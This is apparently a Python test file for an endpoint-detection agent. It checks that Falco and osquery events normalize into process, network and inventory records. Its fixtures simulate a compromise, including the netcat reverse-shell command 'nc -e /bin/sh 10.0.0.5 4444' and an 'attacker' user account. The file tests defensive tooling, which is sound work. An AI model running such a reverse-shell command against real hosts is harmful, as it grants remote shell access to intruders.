from edr_schema.events import HostInfo

from edr_agent.normalizer.ocsf_mapper import normalize

HOST = HostInfo(host_id="h1", hostname="victim-01", os="linux", ip="10.0.0.21")

FALCO_EXEC = {
    "time": "2026-07-05T12:00:00.123456789Z",
    "rule": "EDR process spawned",
    "priority": "Informational",
    "output_fields": {
        "proc.pid": 4321,
        "proc.ppid": 4000,
        "proc.name": "nc",
        "proc.cmdline": "nc -e /bin/sh 10.0.0.5 4444",
        "proc.exepath": "/usr/bin/nc",
        "proc.pname": "bash",
        "proc.pcmdline": "bash",
        "user.name": "www-data",
        "user.uid": 33,
    },
}

FALCO_CONNECT = {
    "time": "2026-07-05T12:00:01.000000000Z",
    "rule": "EDR outbound connection",
    "priority": "Informational",
    "output_fields": {
        "proc.pid": 4321,
        "proc.name": "nc",
        "proc.cmdline": "nc -e /bin/sh 10.0.0.5 4444",
        "fd.l4proto": "tcp",
        "fd.sip": "10.0.0.21",
        "fd.sport": 50512,
        "fd.dip": "10.0.0.5",
        "fd.dport": 4444,
        "user.name": "www-data",
        "user.uid": 33,
    },
}

OSQUERY_DIFF = {
    "name": "listening_ports",
    "hostIdentifier": "victim-01",
    "unixTime": 1783382400,
    "action": "added",
    "columns": {"name": "sshd", "port": "22", "address": "0.0.0.0", "protocol": "6"},
}

OSQUERY_SNAPSHOT = {
    "name": "users_snapshot",
    "hostIdentifier": "victim-01",
    "unixTime": 1783382400,
    "snapshot": [
        {"username": "root", "uid": "0"},
        {"username": "attacker", "uid": "1001"},
    ],
}


def test_falco_exec_maps_to_process_create():
    events = normalize(FALCO_EXEC, "falco", "a1", HOST)
    assert len(events) == 1
    ev = events[0]
    assert ev.event_type == "process_create"
    assert ev.process.pid == 4321
    assert ev.process.parent.name == "bash"
    assert ev.process.user.uid == 33
    assert ev.time.year == 2026 and ev.time.microsecond == 123456
    assert ev.raw["rule"] == "EDR process spawned"


def test_falco_connect_maps_to_network_connection():
    events = normalize(FALCO_CONNECT, "falco", "a1", HOST)
    assert len(events) == 1
    ev = events[0]
    assert ev.event_type == "network_connection"
    assert ev.network.dst_ip == "10.0.0.5"
    assert ev.network.dst_port == 4444
    assert ev.network.process_name == "nc"
    assert ev.process.pid == 4321


def test_osquery_differential_maps_to_inventory():
    events = normalize(OSQUERY_DIFF, "osquery", "a1", HOST)
    assert len(events) == 1
    ev = events[0]
    assert ev.event_type == "inventory"
    assert ev.inventory.query_name == "listening_ports"
    assert ev.inventory.action == "added"
    assert ev.inventory.columns["port"] == "22"


def test_osquery_snapshot_emits_one_event_per_row():
    events = normalize(OSQUERY_SNAPSHOT, "osquery", "a1", HOST)
    assert len(events) == 2
    assert {e.inventory.columns["username"] for e in events} == {"root", "attacker"}
    assert all("snapshot" not in e.raw for e in events)


def test_malformed_event_returns_empty():
    assert normalize({"garbage": True}, "falco", "a1", HOST) == []
    assert normalize({}, "osquery", "a1", HOST) == []
